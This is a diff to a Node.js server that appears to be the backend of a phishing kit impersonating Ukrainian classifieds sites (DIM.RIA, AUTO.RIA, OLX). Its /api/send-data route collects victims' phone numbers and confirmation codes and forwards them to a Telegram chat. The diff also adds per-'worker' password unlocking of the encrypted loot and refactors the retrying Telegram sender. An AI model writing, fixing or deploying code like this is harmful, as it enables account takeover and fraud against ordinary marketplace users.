@@ -32,11 +32,11 @@ const PROJECT_NAMES = {
 // Хранилище паролей воркеров: { worker: 'password' }
 const workerPasswords = {};
 
-// Секретный ключ для шифрования (можно сгенерировать и хранить в .env)
-const ENCRYPTION_KEY = crypto.createHash('sha256').update('your-super-secret-key-2025').digest('base64').substr(0, 32);
+// Секретный ключ для шифрования
+const ENCRYPTION_KEY = crypto.createHash('sha256').update('super-secure-key-2025-xai').digest('base64').substr(0, 32);
 const IV_LENGTH = 16;
 
-// Функция шифрования
+// === Функции шифрования ===
 function encrypt(text) {
     const iv = crypto.randomBytes(IV_LENGTH);
     const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
@@ -45,11 +45,11 @@ function encrypt(text) {
     return iv.toString('hex') + ':' + encrypted;
 }
 
-// Функция расшифровки
 function decrypt(encryptedData) {
     try {
-        const [iv, encrypted] = encryptedData.split(':');
-        const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+        const [ivHex, encrypted] = encryptedData.split(':');
+        const iv = Buffer.from(ivHex, 'hex');
+        const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
         let decrypted = decipher.update(encrypted, 'hex', 'utf8');
         decrypted += decipher.final('utf8');
         return decrypted;
@@ -58,6 +58,7 @@ function decrypt(encryptedData) {
     }
 }
 
+// === Маршруты ===
 app.get('/', (req, res) => {
     const project = req.query.project || 'dimria';
     if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
@@ -74,31 +75,44 @@ app.get('/logo', (req, res) => {
 
 app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));
 
-// === API: Установка пароля для воркера ===
+// === API: Установка/изменение пароля воркера ===
 app.post('/api/set-worker-password', (req, res) => {
     const { worker, password } = req.body;
-    if (!worker || !password) {
-        return res.status(400).json({ success: false, error: 'Потрібен worker і password' });
+    if (!worker || !password || password.length < 4) {
+        return res.status(400).json({ success: false, error: 'worker і пароль (мін. 4 символи)' });
     }
     workerPasswords[worker] = password;
-    res.json({ success: true });
+    res.json({ success: true, message: `Пароль для @${worker} встановлено` });
 });
 
-// === API: Проверка пароля и расшифровка ===
+// === API: Расшифровка по паролю ===
 app.post('/api/decrypt', (req, res) => {
     const { encrypted, password, worker } = req.body;
     if (!encrypted || !password || !worker) {
-        return res.status(400).json({ success: false });
+        return res.status(400).json({ success: false, error: 'Всі поля обов’язкові' });
     }
+
     if (workerPasswords[worker] !== password) {
         return res.json({ success: false, error: 'Невірний пароль' });
     }
+
     const decrypted = decrypt(encrypted);
+    if (!decrypted) {
+        return res.json({ success: false, error: 'Помилка розшифровки' });
+    }
+
     res.json({ success: true, data: decrypted });
 });
 
-async function sendToTelegram(message) {
-    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
+// === Отправка в Telegram ===
+async function sendToTelegram(message, keyboard) {
+    const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown',
+        reply_markup: keyboard
+    };
+
     for (let i = 0; i < 3; i++) {
         try {
             const res = await fetch(TELEGRAM_API, {
@@ -109,7 +123,6 @@ async function sendToTelegram(message) {
             });
             const result = await res.json();
             if (res.ok && result.ok) return true;
-            console.error('Telegram error:', result);
             if (result.error_code === 403) return false;
         } catch (err) {
             console.error(`Попытка ${i + 1}:`, err.message);
@@ -120,9 +133,9 @@ async function sendToTelegram(message) {
     return false;
 }
 
+// === API: Приём данных от клиента ===
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
-
     const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
 
     let message = '';
@@ -142,7 +155,7 @@ app.post('/api/send-data', async (req, res) => {
         return res.status(400).json({ success: false });
     }
 
-    // Добавляем кнопку для расшифровки
+    // Кнопка расшифровки
     const keyboard = {
         inline_keyboard: [[
             {
@@ -152,35 +165,11 @@ app.post('/api/send-data', async (req, res) => {
         ]]
     };
 
-    const payload = {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-        reply_markup: keyboard
-    };
-
-    let ok = false;
-    for (let i = 0; i < 3; i++) {
-        try {
-            const res = await fetch(TELEGRAM_API, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                timeout: 10000
-            });
-            const result = await res.json();
-            if (res.ok && result.ok) { ok = true; break; }
-            if (result.error_code === 403) break;
-        } catch (err) {
-            console.error(`Попытка ${i + 1}:`, err.message);
-            if (i === 2) break;
-            await new Promise(r => setTimeout(r, 2000));
-        }
-    }
-
+    const ok = await sendToTelegram(message, keyboard);
     res.json({ success: ok });
 });
 
+// === Запуск ===
 app.listen(PORT, () => {
     console.log(`Сервер: http://localhost:${PORT}`);
     console.log(`Панель: http://localhost:${PORT}/panel`);
